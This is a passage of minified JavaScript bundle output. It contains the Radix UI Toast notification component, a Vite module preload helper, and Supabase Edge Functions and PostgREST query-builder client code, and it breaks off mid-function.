WS({prop:n,defaultProp:e,onChange:r=()=>{},caller:s}){const[a,l,c]=$S({defaultProp:e,onChange:r}),d=n!==void 0,p=d?n:a;{const m=C.useRef(n!==void 0);C.useEffect(()=>{const y=m.current;y!==d&&console.warn(`${s} is changing from ${y?"controlled":"uncontrolled"} to ${d?"controlled":"uncontrolled"}. Components should not switch from controlled to uncontrolled (or vice versa). Decide between using a controlled or uncontrolled value for the lifetime of the component.`),m.current=d},[d,s])}const f=C.useCallback(m=>{if(d){const y=HS(m)?m(n):m;y!==n&&c.current?.(y)}else l(m)},[d,n,l,c]);return[p,f]}function $S({defaultProp:n,onChange:e}){const[r,s]=C.useState(n),a=C.useRef(r),l=C.useRef(e);return VS(()=>{l.current=e},[e]),C.useEffect(()=>{a.current!==r&&(l.current?.(r),a.current=r)},[r,a]),[r,s,l]}function HS(n){return typeof n=="function"}var qS=Object.freeze({position:"absolute",border:0,width:1,height:1,padding:0,margin:-1,overflow:"hidden",clip:"rect(0, 0, 0, 0)",whiteSpace:"nowrap",wordWrap:"normal"}),GS="VisuallyHidden",od=C.forwardRef((n,e)=>T.jsx(nn.span,{...n,ref:e,style:{...qS,...n.style}}));od.displayName=GS;var ad="ToastProvider",[ld,KS,JS]=ES("Toast"),[sb]=Yy("Toast",[JS]),[QS,Ia]=sb(ad),ob=n=>{const{__scopeToast:e,label:r="Notification",duration:s=5e3,swipeDirection:a="right",swipeThreshold:l=50,children:c}=n,[d,p]=C.useState(null),[f,m]=C.useState(0),y=C.useRef(!1),v=C.useRef(!1);return r.trim()||console.error(`Invalid prop \`label\` supplied to \`${ad}\`. Expected non-empty \`string\`.`),T.jsx(ld.Provider,{scope:e,children:T.jsx(QS,{scope:e,label:r,duration:s,swipeDirection:a,swipeThreshold:l,toastCount:f,viewport:d,onViewportChange:p,onToastAdd:C.useCallback(()=>m(w=>w+1),[]),onToastRemove:C.useCallback(()=>m(w=>w-1),[]),isFocusedToastEscapeKeyDownRef:y,isClosePausedRef:v,children:c})})};ob.displayName=ad;var ab="ToastViewport",YS=["F8"],vu="toast.viewportPause",wu="toast.viewportResume",lb=C.forwardRef((n,e)=>{const{__scopeToast:r,hotkey:s=YS,label:a="Notifications ({hotkey})",...l}=n,c=Ia(ab,r),d=KS(r),p=C.useRef(null),f=C.useRef(null),m=C.useRef(null),y=C.useRef(null),v=kr(e,y,c.onViewportChange),w=s.join("+").replace(/Key/g,"").replace(/Digit/g,""),A=c.toastCount>0;C.useEffect(()=>{const x=B=>{s.length!==0&&s.every(P=>B[P]||B.code===P)&&y.current?.focus()};return document.addEventListener("keydown",x),()=>document.removeEventListener("keydown",x)},[s]),C.useEffect(()=>{const x=p.current,B=y.current;if(A&&x&&B){const _=()=>{if(!c.isClosePausedRef.current){const U=new CustomEvent(vu);B.dispatchEvent(U),c.isClosePausedRef.current=!0}},P=()=>{if(c.isClosePausedRef.current){const U=new CustomEvent(wu);B.dispatchEvent(U),c.isClosePausedRef.current=!1}},M=U=>{!x.contains(U.relatedTarget)&&P()},V=()=>{x.contains(document.activeElement)||P()};return x.addEventListener("focusin",_),x.addEventListener("focusout",M),x.addEventListener("pointermove",_),x.addEventListener("pointerleave",V),window.addEventListener("blur",_),window.addEventListener("focus",P),()=>{x.removeEventListener("focusin",_),x.removeEventListener("focusout",M),x.removeEventListener("pointermove",_),x.removeEventListener("pointerleave",V),window.removeEventListener("blur",_),window.removeEventListener("focus",P)}}},[A,c.isClosePausedRef]);const k=C.useCallback(({tabbingDirection:x})=>{const _=d().map(P=>{const M=P.ref.current,V=[M,...uT(M)];return x==="forwards"?V:V.reverse()});return(x==="forwards"?_.reverse():_).flat()},[d]);return C.useEffect(()=>{const x=y.current;if(x){const B=_=>{const P=_.altKey||_.ctrlKey||_.metaKey;if(_.key==="Tab"&&!P){const V=document.activeElement,U=_.shiftKey;if(_.target===x&&U){f.current?.focus();return}const ee=k({tabbingDirection:U?"backwards":"forwards"}),ye=ee.findIndex(Ae=>Ae===V);Hc(ee.slice(ye+1))?_.preventDefault():U?f.current?.focus():m.current?.focus()}};return x.addEventListener("keydown",B),()=>x.removeEventListener("keydown",B)}},[d,k]),T.jsxs(NS,{ref:p,role:"region","aria-label":a.replace("{hotkey}",w),tabIndex:-1,style:{pointerEvents:A?void 0:"none"},children:[A&&T.jsx(ku,{ref:f,onFocusFromOutsideViewport:()=>{const x=k({tabbingDirection:"forwards"});Hc(x)}}),T.jsx(ld.Slot,{scope:r,children:T.jsx(nn.ol,{tabIndex:-1,...l,ref:v})}),A&&T.jsx(ku,{ref:m,onFocusFromOutsideViewport:()=>{const x=k({tabbingDirection:"backwards"});Hc(x)}})]})});lb.displayName=ab;var cb="ToastFocusProxy",ku=C.forwardRef((n,e)=>{const{__scopeToast:r,onFocusFromOutsideViewport:s,...a}=n,l=Ia(cb,r);return T.jsx(od,{tabIndex:0,...a,ref:e,style:{position:"fixed"},onFocus:c=>{const d=c.relatedTarget;!l.viewport?.contains(d)&&s()}})});ku.displayName=cb;var Is="Toast",XS="toast.swipeStart",ZS="toast.swipeMove",eT="toast.swipeCancel",tT="toast.swipeEnd",ub=C.forwardRef((n,e)=>{const{forceMount:r,open:s,defaultOpen:a,onOpenChange:l,...c}=n,[d,p]=WS({prop:s,defaultProp:a??!0,onChange:l,caller:Is});return T.jsx(ib,{present:r||d,children:T.jsx(iT,{open:d,...c,ref:e,onClose:()=>p(!1),onPause:xr(n.onPause),onResume:xr(n.onResume),onSwipeStart:Et(n.onSwipeStart,f=>{f.currentTarget.setAttribute("data-swipe","start")}),onSwipeMove:Et(n.onSwipeMove,f=>{const{x:m,y}=f.detail.delta;f.currentTarget.setAttribute("data-swipe","move"),f.currentTarget.style.setProperty("--radix-toast-swipe-move-x",`${m}px`),f.currentTarget.style.setProperty("--radix-toast-swipe-move-y",`${y}px`)}),onSwipeCancel:Et(n.onSwipeCancel,f=>{f.currentTarget.setAttribute("data-swipe","cancel"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),f.currentTarget.style.removeProperty("--radix-toast-swipe-end-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-end-y")}),onSwipeEnd:Et(n.onSwipeEnd,f=>{const{x:m,y}=f.detail.delta;f.currentTarget.setAttribute("data-swipe","end"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),f.currentTarget.style.setProperty("--radix-toast-swipe-end-x",`${m}px`),f.currentTarget.style.setProperty("--radix-toast-swipe-end-y",`${y}px`),p(!1)})})})});ub.displayName=Is;var[nT,rT]=sb(Is,{onClose(){}}),iT=C.forwardRef((n,e)=>{const{__scopeToast:r,type:s="foreground",duration:a,open:l,onClose:c,onEscapeKeyDown:d,onPause:p,onResume:f,onSwipeStart:m,onSwipeMove:y,onSwipeCancel:v,onSwipeEnd:w,...A}=n,k=Ia(Is,r),[x,B]=C.useState(null),_=kr(e,K=>B(K)),P=C.useRef(null),M=C.useRef(null),V=a||k.duration,U=C.useRef(0),W=C.useRef(V),G=C.useRef(0),{onToastAdd:ee,onToastRemove:ye}=k,Ae=xr(()=>{x?.contains(document.activeElement)&&k.viewport?.focus(),c()}),q=C.useCallback(K=>{!K||K===1/0||(window.clearTimeout(G.current),U.current=new Date().getTime(),G.current=window.setTimeout(Ae,K))},[Ae]);C.useEffect(()=>{const K=k.viewport;if(K){const fe=()=>{q(W.current),f?.()},ae=()=>{const pe=new Date().getTime()-U.current;W.current=W.current-pe,window.clearTimeout(G.current),p?.()};return K.addEventListener(vu,ae),K.addEventListener(wu,fe),()=>{K.removeEventListener(vu,ae),K.removeEventListener(wu,fe)}}},[k.viewport,V,p,f,q]),C.useEffect(()=>{l&&!k.isClosePausedRef.current&&q(V)},[l,V,k.isClosePausedRef,q]),C.useEffect(()=>(ee(),()=>ye()),[ee,ye]);const le=C.useMemo(()=>x?yb(x):null,[x]);return k.viewport?T.jsxs(T.Fragment,{children:[le&&T.jsx(sT,{__scopeToast:r,role:"status","aria-live":s==="foreground"?"assertive":"polite",children:le}),T.jsx(nT,{scope:r,onClose:Ae,children:sd.createPortal(T.jsx(ld.ItemSlot,{scope:r,children:T.jsx(BS,{asChild:!0,onEscapeKeyDown:Et(d,()=>{k.isFocusedToastEscapeKeyDownRef.current||Ae(),k.isFocusedToastEscapeKeyDownRef.current=!1}),children:T.jsx(nn.li,{tabIndex:0,"data-state":l?"open":"closed","data-swipe-direction":k.swipeDirection,...A,ref:_,style:{userSelect:"none",touchAction:"none",...n.style},onKeyDown:Et(n.onKeyDown,K=>{K.key==="Escape"&&(d?.(K.nativeEvent),K.nativeEvent.defaultPrevented||(k.isFocusedToastEscapeKeyDownRef.current=!0,Ae()))}),onPointerDown:Et(n.onPointerDown,K=>{K.button===0&&(P.current={x:K.clientX,y:K.clientY})}),onPointerMove:Et(n.onPointerMove,K=>{if(!P.current)return;const fe=K.clientX-P.current.x,ae=K.clientY-P.current.y,pe=!!M.current,H=["left","right"].includes(k.swipeDirection),Y=["left","up"].includes(k.swipeDirection)?Math.min:Math.max,J=H?Y(0,fe):0,I=H?0:Y(0,ae),N=K.pointerType==="touch"?10:2,ne={x:J,y:I},he={originalEvent:K,delta:ne};pe?(M.current=ne,Qo(ZS,y,he,{discrete:!1})):_g(ne,k.swipeDirection,N)?(M.current=ne,Qo(XS,m,he,{discrete:!1}),K.target.setPointerCapture(K.pointerId)):(Math.abs(fe)>N||Math.abs(ae)>N)&&(P.current=null)}),onPointerUp:Et(n.onPointerUp,K=>{const fe=M.current,ae=K.target;if(ae.hasPointerCapture(K.pointerId)&&ae.releasePointerCapture(K.pointerId),M.current=null,P.current=null,fe){const pe=K.currentTarget,H={originalEvent:K,delta:fe};_g(fe,k.swipeDirection,k.swipeThreshold)?Qo(tT,w,H,{discrete:!0}):Qo(eT,v,H,{discrete:!0}),pe.addEventListener("click",Y=>Y.preventDefault(),{once:!0})}})})})}),k.viewport)})]}):null}),sT=n=>{const{__scopeToast:e,children:r,...s}=n,a=Ia(Is,e),[l,c]=C.useState(!1),[d,p]=C.useState(!1);return lT(()=>c(!0)),C.useEffect(()=>{const f=window.setTimeout(()=>p(!0),1e3);return()=>window.clearTimeout(f)},[]),d?null:T.jsx(rb,{asChild:!0,children:T.jsx(od,{...s,children:l&&T.jsxs(T.Fragment,{children:[a.label," ",r]})})})},oT="ToastTitle",db=C.forwardRef((n,e)=>{const{__scopeToast:r,...s}=n;return T.jsx(nn.div,{...s,ref:e})});db.displayName=oT;var aT="ToastDescription",hb=C.forwardRef((n,e)=>{const{__scopeToast:r,...s}=n;return T.jsx(nn.div,{...s,ref:e})});hb.displayName=aT;var pb="ToastAction",fb=C.forwardRef((n,e)=>{const{altText:r,...s}=n;return r.trim()?T.jsx(mb,{altText:r,asChild:!0,children:T.jsx(cd,{...s,ref:e})}):(console.error(`Invalid prop \`altText\` supplied to \`${pb}\`. Expected non-empty \`string\`.`),null)});fb.displayName=pb;var gb="ToastClose",cd=C.forwardRef((n,e)=>{const{__scopeToast:r,...s}=n,a=rT(gb,r);return T.jsx(mb,{asChild:!0,children:T.jsx(nn.button,{type:"button",...s,ref:e,onClick:Et(n.onClick,a.onClose)})})});cd.displayName=gb;var mb=C.forwardRef((n,e)=>{const{__scopeToast:r,altText:s,...a}=n;return T.jsx(nn.div,{"data-radix-toast-announce-exclude":"","data-radix-toast-announce-alt":s||void 0,...a,ref:e})});function yb(n){const e=[];return Array.from(n.childNodes).forEach(s=>{if(s.nodeType===s.TEXT_NODE&&s.textContent&&e.push(s.textContent),cT(s)){const a=s.ariaHidden||s.hidden||s.style.display==="none",l=s.dataset.radixToastAnnounceExclude==="";if(!a)if(l){const c=s.dataset.radixToastAnnounceAlt;c&&e.push(c)}else e.push(...yb(s))}}),e}function Qo(n,e,r,{discrete:s}){const a=r.originalEvent.currentTarget,l=new CustomEvent(n,{bubbles:!0,cancelable:!0,detail:r});e&&a.addEventListener(n,e,{once:!0}),s?Xy(a,l):a.dispatchEvent(l)}var _g=(n,e,r=0)=>{const s=Math.abs(n.x),a=Math.abs(n.y),l=s>a;return e==="left"||e==="right"?l&&s>r:!l&&a>r};function lT(n=()=>{}){const e=xr(n);Ss(()=>{let r=0,s=0;return r=window.requestAnimationFrame(()=>s=window.requestAnimationFrame(e)),()=>{window.cancelAnimationFrame(r),window.cancelAnimationFrame(s)}},[e])}function cT(n){return n.nodeType===n.ELEMENT_NODE}function uT(n){const e=[],r=document.createTreeWalker(n,NodeFilter.SHOW_ELEMENT,{acceptNode:s=>{const a=s.tagName==="INPUT"&&s.type==="hidden";return s.disabled||s.hidden||a?NodeFilter.FILTER_SKIP:s.tabIndex>=0?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_SKIP}});for(;r.nextNode();)e.push(r.currentNode);return e}function Hc(n){const e=document.activeElement;return n.some(r=>r===e?!0:(r.focus(),document.activeElement!==e))}var dT=ob,bb=lb,vb=ub,wb=db,kb=hb,xb=fb,Sb=cd;const hT=1,pT=1e6,fn={ADD_TOAST:"ADD_TOAST",UPDATE_TOAST:"UPDATE_TOAST",DISMISS_TOAST:"DISMISS_TOAST",REMOVE_TOAST:"REMOVE_TOAST"};let qc=0;function fT(){return qc=(qc+1)%Number.MAX_VALUE,qc.toString()}const Gc=new Map,Ig=n=>{if(Gc.has(n))return;const e=setTimeout(()=>{Gc.delete(n),ms({type:fn.REMOVE_TOAST,toastId:n})},pT);Gc.set(n,e)},gT=(n,e)=>{switch(e.type){case fn.ADD_TOAST:return{...n,toasts:[e.toast,...n.toasts].slice(0,hT)};case fn.UPDATE_TOAST:return{...n,toasts:n.toasts.map(r=>r.id===e.toast.id?{...r,...e.toast}:r)};case fn.DISMISS_TOAST:{const{toastId:r}=e;return r?Ig(r):n.toasts.forEach(s=>{Ig(s.id)}),{...n,toasts:n.toasts.map(s=>s.id===r||r===void 0?{...s,open:!1}:s)}}case fn.REMOVE_TOAST:return e.toastId===void 0?{...n,toasts:[]}:{...n,toasts:n.toasts.filter(r=>r.id!==e.toastId)}}},ra=[];let ia={toasts:[]};function ms(n){ia=gT(ia,n),ra.forEach(e=>{e(ia)})}function mT(n){const e=fT(),r=a=>ms({type:fn.UPDATE_TOAST,toast:{...a,id:e}}),s=()=>ms({type:fn.DISMISS_TOAST,toastId:e});return ms({type:fn.ADD_TOAST,toast:{...n,id:e,open:!0,onOpenChange:a=>{a||s()}}}),{id:e,dismiss:s,update:r}}function ud(){const[n,e]=Ee.useState(ia);return Ee.useEffect(()=>(ra.push(e),()=>{const r=ra.indexOf(e);r>-1&&ra.splice(r,1)}),[n]),{...n,toast:mT,dismiss:r=>ms({type:fn.DISMISS_TOAST,toastId:r})}}const yT="modulepreload",bT=function(n){return"/"+n},Rg={},Rs=function(e,r,s){let a=Promise.resolve();if(r&&r.length>0){let f=function(m){return Promise.all(m.map(y=>Promise.resolve(y).then(v=>({status:"fulfilled",value:v}),v=>({status:"rejected",reason:v}))))};var c=f;document.getElementsByTagName("link");const d=document.querySelector("meta[property=csp-nonce]"),p=d?.nonce||d?.getAttribute("nonce");a=f(r.map(m=>{if(m=bT(m),m in Rg)return;Rg[m]=!0;const y=m.endsWith(".css"),v=y?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${m}"]${v}`))return;const w=document.createElement("link");if(w.rel=y?"stylesheet":yT,y||(w.as="script"),w.crossOrigin="",w.href=m,p&&w.setAttribute("nonce",p),document.head.appendChild(w),y)return new Promise((A,k)=>{w.addEventListener("load",A),w.addEventListener("error",()=>k(new Error(`Unable to preload CSS for ${m}`)))})}))}function l(d){const p=new Event("vite:preloadError",{cancelable:!0});if(p.payload=d,window.dispatchEvent(p),!p.defaultPrevented)throw d}return a.then(d=>{for(const p of d||[])p.status==="rejected"&&l(p.reason);return e().catch(l)})},vT=n=>{let e;return n?e=n:typeof fetch>"u"?e=(...r)=>Rs(async()=>{const{default:s}=await Promise.resolve().then(()=>vi);return{default:s}},void 0).then(({default:s})=>s(...r)):e=fetch,(...r)=>e(...r)};class dd extends Error{constructor(e,r="FunctionsError",s){super(e),this.name=r,this.context=s}}class Dg extends dd{constructor(e){super("Failed to send a request to the Edge Function","FunctionsFetchError",e)}}class Og extends dd{constructor(e){super("Relay Error invoking the Edge Function","FunctionsRelayError",e)}}class jg extends dd{constructor(e){super("Edge Function returned a non-2xx status code","FunctionsHttpError",e)}}var xu;(function(n){n.Any="any",n.ApNortheast1="ap-northeast-1",n.ApNortheast2="ap-northeast-2",n.ApSouth1="ap-south-1",n.ApSoutheast1="ap-southeast-1",n.ApSoutheast2="ap-southeast-2",n.CaCentral1="ca-central-1",n.EuCentral1="eu-central-1",n.EuWest1="eu-west-1",n.EuWest2="eu-west-2",n.EuWest3="eu-west-3",n.SaEast1="sa-east-1",n.UsEast1="us-east-1",n.UsWest1="us-west-1",n.UsWest2="us-west-2"})(xu||(xu={}));var wT=function(n,e,r,s){function a(l){return l instanceof r?l:new r(function(c){c(l)})}return new(r||(r=Promise))(function(l,c){function d(m){try{f(s.next(m))}catch(y){c(y)}}function p(m){try{f(s.throw(m))}catch(y){c(y)}}function f(m){m.done?l(m.value):a(m.value).then(d,p)}f((s=s.apply(n,e||[])).next())})};class kT{constructor(e,{headers:r={},customFetch:s,region:a=xu.Any}={}){this.url=e,this.headers=r,this.region=a,this.fetch=vT(s)}setAuth(e){this.headers.Authorization=`Bearer ${e}`}invoke(e){return wT(this,arguments,void 0,function*(r,s={}){var a;try{const{headers:l,method:c,body:d,signal:p}=s;let f={},{region:m}=s;m||(m=this.region);const y=new URL(`${this.url}/${r}`);m&&m!=="any"&&(f["x-region"]=m,y.searchParams.set("forceFunctionRegion",m));let v;d&&(l&&!Object.prototype.hasOwnProperty.call(l,"Content-Type")||!l)&&(typeof Blob<"u"&&d instanceof Blob||d instanceof ArrayBuffer?(f["Content-Type"]="application/octet-stream",v=d):typeof d=="string"?(f["Content-Type"]="text/plain",v=d):typeof FormData<"u"&&d instanceof FormData?v=d:(f["Content-Type"]="application/json",v=JSON.stringify(d)));const w=yield this.fetch(y.toString(),{method:c||"POST",headers:Object.assign(Object.assign(Object.assign({},f),this.headers),l),body:v,signal:p}).catch(B=>{throw B.name==="AbortError"?B:new Dg(B)}),A=w.headers.get("x-relay-error");if(A&&A==="true")throw new Og(w);if(!w.ok)throw new jg(w);let k=((a=w.headers.get("Content-Type"))!==null&&a!==void 0?a:"text/plain").split(";")[0].trim(),x;return k==="application/json"?x=yield w.json():k==="application/octet-stream"?x=yield w.blob():k==="text/event-stream"?x=w:k==="multipart/form-data"?x=yield w.formData():x=yield w.text(),{data:x,error:null,response:w}}catch(l){return l instanceof Error&&l.name==="AbortError"?{data:null,error:new Dg(l)}:{data:null,error:l,response:l instanceof jg||l instanceof Og?l.context:void 0}}})}}var tt={},Xr={},Zr={},ei={},ti={},ni={},xT=function(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("unable to locate global object")},bi=xT();const ST=bi.fetch,Tb=bi.fetch.bind(bi),Ab=bi.Headers,TT=bi.Request,AT=bi.Response,vi=Object.freeze(Object.defineProperty({__proto__:null,Headers:Ab,Request:TT,Response:AT,default:Tb,fetch:ST},Symbol.toStringTag,{value:"Module"})),CT=qw(vi);var Yo={},Mg;function Cb(){if(Mg)return Yo;Mg=1,Object.defineProperty(Yo,"__esModule",{value:!0});class n extends Error{constructor(r){super(r.message),this.name="PostgrestError",this.details=r.details,this.hint=r.hint,this.code=r.code}}return Yo.default=n,Yo}var Bg;function Eb(){if(Bg)return ni;Bg=1;var n=ni&&ni.__importDefault||function(a){return a&&a.__esModule?a:{default:a}};Object.defineProperty(ni,"__esModule",{value:!0});const e=n(CT),r=n(Cb());class s{constructor(l){var c,d;this.shouldThrowOnError=!1,this.method=l.method,this.url=l.url,this.headers=new Headers(l.headers),this.schema=l.schema,this.body=l.body,this.shouldThrowOnError=(c=l.shouldThrowOnError)!==null&&c!==void 0?c:!1,this.signal=l.signal,this.isMaybeSingle=(d=l.isMaybeSingle)!==null&&d!==void 0?d:!1,l.fetch?this.fetch=l.fetch:typeof fetch>"u"?this.fetch=e.default:this.fetch=fetch}throwOnError(){return this.shouldThrowOnError=!0,this}setHeader(l,c){return this.headers=new Headers(this.headers),this.headers.set(l,c),this}then(l,c){this.schema===void 0||(["GET","HEAD"].includes(this.method)?this.headers.set("Accept-Profile",this.schema):this.headers.set("Content-Profile",this.schema)),this.method!=="GET"&&this.method!=="HEAD"&&this.headers.set("Content-Type","application/json");const d=this.fetch;let p=d(this.url.toString(),{method:this.method,headers:this.headers,body:JSON.stringify(this.body),signal:this.signal}).then(async f=>{var m,y,v,w;let A=null,k=null,x=null,B=f.status,_=f.statusText;if(f.ok){if(this.method!=="HEAD"){const U=await f.text();U===""||(this.headers.get("Accept")==="text/csv"||this.headers.get("Accept")&&(!((m=this.headers.get("Accept"))===null||m===void 0)&&m.includes("application/vnd.pgrst.plan+text"))?k=U:k=JSON.parse(U))}const M=(y=this.headers.get("Prefer"))===null||y===void 0?void 0:y.match(/count=(exact|planned|estimated)/),V=(v=f.headers.get("content-range"))===null||v===void 0?void 0:v.split("/");M&&V&&V.length>1&&(x=parseInt(V[1])),this.isMaybeSingle&&this.method==="GET"&&Array.isArray(k)&&(k.length>1?(A={code:"PGRST116",details:`Results contain ${k.length} rows, application/vnd.pgrst.object+json requires 1 row`,hint:null,message:"JSON object requested, multiple (or no) rows returned"},k=null,x=null,B=406,_="Not Acceptable"):k.length===1?k=k[0]:k=null)}else{const M=await f.text();try{A=JSON.parse(M),Array.isArray(A)&&f.status===404&&(k=[],A=null,B=200,_="OK")}catch{f.status===404&&M===""?(B=204,_="No Content"):A={message:M}}if(A&&this.isMaybeSingle&&(!((w=A?.details)===null||w===void 0)&&w.includes("0 rows"))&&(A=null,B=200,_="OK"),A&&this.shouldThrowOnError)throw new r.default(A)}return{error:A,data:k,count:x,status:B,statusText:_}});return this.shouldThrowOnError||(p=p.catch(f=>{var m,y,v;return{error:{message:`${(m=f?.name)!==null&&m!==void 0?m:"FetchError"}: ${f?.message}`,details:`${(y=f?.stack)!==null&&y!==void 0?y:""}`,hint:"",code:`${(v=f?.code)!==null&&v!==void 0?v:""}`},data:null,count:null,status:0,statusText:""}})),p.then(l,c)}returns(){return this}overrideTypes(){return this}}return ni.default=s,ni}var Ng;function Pb(){if(Ng)return ti;Ng=1;var n=ti&&ti.__importDefault||function(s){return s&&s.__esModule?s:{default:s}};Object.defineProperty(ti,"__esModule",{value:!0});const e=n(Eb());class r extends e.default{select(a){let l=!1;const c=(a??"*").split("").map(d=>/\s/.test(d)&&!l?"":(d==='"'&&(l=!l),d)).join("");return this.url.searchParams.set("select",c),this.headers.append("Prefer","return=representation"),this}order(a,{ascending:l=!0,nullsFirst:c,foreignTable:d,referencedTable:p=d}={}){const f=p?`${p}.order`:"order",m=this.url.searchParams.get(f);return this.url.searchParams.set(f,`${m?`${m},`:""}${a}.${l?"asc":"desc"}${c===void 0?"":c?".nullsfirst":".nullslast"}`),this}limit(a,{foreignTable:l,referencedTable:c=l}={}){const d=typeof c>"u"?"limit":`${c}.limit`;return this.url.searchParams.set(d,`${a}`),this}range(a,l,{foreignTable:c,referencedTable:d=c}={}){const p=typeof d>"u"?"offset":`${d}.offset`,f=typeof d>"u"?"limit":`${d}.limit`;return this.url.searchParams.set(p,`${a}`),this.url.searchParams.set(f,`${l-a+1}`),this}abortSignal(a){return this.signal=a,this}single(){return this.headers.set("Accept","application/vnd.pgrst.object+json"),this}maybeSingle(){return this.method==="GET"?this.headers.set("Accept","application/json"):this.headers.set("Accept","application/vnd.pgrst.object+json"),this.isMaybeSingle=!0,this}csv(){return this.headers.set("Accept","text/csv"),this}geojson(){return this.headers.set("Accept","application/geo+json"),this}explain({analyze:a=!1,verbose:l=!1,settings:c=!1,buffers:d=!1,wal:p=!1,format:f="text"}={}){var m;const y=[a?"analyze":null,l?"verbose":null,c?"settings":null,d?"buffers":null,p?"wal":null].filter(Boolean).join("|"),v=(m=this.headers.get("Accept"))!==null&&m!==void 0?m:"application/json";return this.headers.set("Accept",`application/vnd.pgrst.plan+${f}; for="${v}"; options=${y};`),f==="json"?this:this}rollback(){return this.headers.append("Prefer","tx=rollback"),this}returns(){return this}maxAffected(a){return this.headers.append("Prefer","handling=strict"),this.headers.append("Prefer",`max-affected=${a}`),this}}return ti.default=r,ti}var Lg;function hd(){if(Lg)return ei;Lg=1;var n=ei&&ei.__importDefault||function(s){return s&&s.__esModule?s:{default:s}};Object.defineProperty(ei,"__esModule",{value:!0});const e=n(Pb());class r extends e.default{eq(a,l){return this.url.searchParams.append(a,`eq.${l}`),this}neq(a,l){return this.url.searchParams.append(a,`neq.${l}`),this}gt(a,l){return this.url.searchParams.append(a,`gt.${l}`),this}gte(a,l){return this.url.searchParams.append(a,`gte.${l}`),this}lt(a,l){return this.url.searchParams.append(a,`lt.${l}`),this}lte(a,l){return this.url.searchParams.append(a,`lte.${l}`),this}like(a,l){return this.url.searchParams.append(a,`like.${l}`),this}likeAllOf(a,l){return this.url.searchParams.append(a,`like(all).{${l.join(",")}}`),this}likeAnyOf(a,l){return this.url.searchParams.append(a,`like(any).{${l.join(",")}}`),this}ilike(a,l){return this.url.searchParams.append(a,`ilike.${l}`),this}ilikeAllOf(a,l){return this.url.searchParams.append(a,`ilike(all).{${l.join(",")}}`),this}ilikeAnyOf(a,l){return this.url.searchParams.append(a,`ilike(any).{${l.join(",")}}`),this}is(a,l){return this.url.searchParams.append(a,`is.${l}`),this}in(a,l){const c=Array.from(new Set(l)).map(d=>typeof d=="string"&&new RegExp("[,()]").test(d)?`"${d}"`:`${d}`).join(",");return this.url.searchParams.append(a,`in.(${c})`),this}contains(a,l){return typeof l=="string"?this.url.searchParams.append(a,`cs.${l}`):Array.isArray(l)?this.url.searchParams.append(a,`cs.{${l.join(",")}}`):this.url.searchParams.append(a,`cs.${JSON.stringify(l)}`),this}containedBy(a,l){return typeof l=="string"?this.url.searchParams.append(a,`cd.${l}`):Array.isArray(l)?this.url.searchParams.append(a,`cd.{${l.join(",")}}`):this.url.searchParams.append(a,`cd.${JSON.stringify(l)}`),this}rangeGt(a,l){return this.url.searchParams.append(a,`sr.${l}`),this}rangeGte(a,l){return this.url.searchParams.append(a,`nxl.${l}`),this}rangeLt(a,l){return this.url.searchParams.append(a,`sl.${l}`),this}rangeLte(a,l){return this.url.searchParams.append(a,`nxr.${l}`),this}rangeAdjacent(a,l){return this.url.searchParams.append(a,`adj.${l}`),this}overlaps(a,l){return typeof l=="string"?this.url.searchParams.append(a,`ov.${l}`):this.url.searchParams.append(a,`ov.{${l.join(",")}}`),this}textSearch(a,l,{config:c,type:d}={}){let p="";d==="plain"?p="pl":d==="phrase"?p="ph":d==="websearch"&&(p="w");const f=c===void 0?"":`(${c})`;return this.url.searchParams.append(a,`${p}fts${f}.${l}`),this}match(a){return Object.entries(a).forEach(([l,c])=>{this.url.searchParams.append(l,`eq.${c}`)}),this}not(a,l,c){return this.url.searchParams.append(a,`not.${l}.${c}`),this}or(a,{foreignTable:l,referencedTable:c=l}={}){const d=c?`${c}.or`:"or";return this.url.searchParams.append(d,`(${a})`),this}filter(a,l,c){return this.url.searchParams.append(a,`${l}.${c}`),this}}return ei.default=r,ei}var Fg;function _b(){if(Fg)return Zr;Fg=1;var n=Zr&&Zr.__importDefault||function(s){return s&&s.__esModule?s:{default:s}};Object.defineProperty(Zr,"__esModule",{value:!0});const e=n(hd());class r{constructor(a,{headers:l={},schema:c,fetch:d}){this.url=a,this.headers=new Headers(l),this.schema=c,this.fetch=d}select(a,l){const{head:c=!1,count:d}=l??{},p=c?"HEAD":"GET";let f=!1;const m=(a??"*").split("").map(y=>/\s/.test(y)&&!f?"":(y==='"'&&(f=!f),y)).join("");return this.url.searchParams.set("select",m),d&&this.headers.append("Prefer",`count=${d}`),new e.default({method:p,url:this.url,headers:this.headers,schema:this.schema,fetch:this.fetch})}insert(a,{count:l,defaultToNull:c=!0}={}){var d;const p="POST";if(l&&this.headers.append("Prefer",`count=${l}`),c||this.headers.append("Prefer","missing=default"),Array.isArray(a)){const f=a.reduce((m,y)=>m.concat(Object.keys(y)),[]);if(f.length>0){const m=[...new Set(f)].map(y=>`"${y}"`);this.url.searchParams.set("columns",m.join(","))}}return new e.default({method:p,url:this.url,headers:this.headers,schema:this.schema,body:a,fetch:(d=this.fetch)!==null&&d!==void 0?d:fetch})}upsert(a,{onConflict:l,ignoreDuplicates:c=!1,count:d,defaultToNull:p=!0}={}){var f;const m="POST";if(this.headers.append("Prefer",`resolution=${c?"ignore":"merge"}-duplicates`),l!==void 0&&this.url.searchParams.set("on_conflict",l),d&&this.headers.append("Prefer",`count=${d}`),p||this.headers.append("Prefer","missing=default"),Array.isArray(a)){const y=a.reduce((v,w)=>v.concat(Object.keys(w)),[]);if(y.length>0){const v=[...new Set(y)].map(w=>`"${w}"`);this.url.searchParams.set("columns",v.join(","))}}return new e.default({method:m,url:this.url,headers:this.headers,schema:this.schema,body:a,fetch:(f=this.fetch)!==null&&f!==void 0?f:fetch})}update(a,{count:l}={}){var c;const d="PATCH";return l&&this.headers.append("Prefer",`count=${l}`),new e.default({method:d,url:this.url,headers:this.headers,schema:this.schema,body:a,fetch:(c=this.fetch)!==null&&c!==void 0?c:fetch})}delete({count:a}={}){var l;const c="DELETE";return a&&this.headers.append("Prefer",`count=${a}`),new e.default({method:c,url:this.url,headers:this.headers,schema:this.schema,fetch:(l=this.fetch)!==null&&l!==void 0?l:fetch})}}return Zr.default=r,Zr}var Ug;function ET(){if(Ug)return 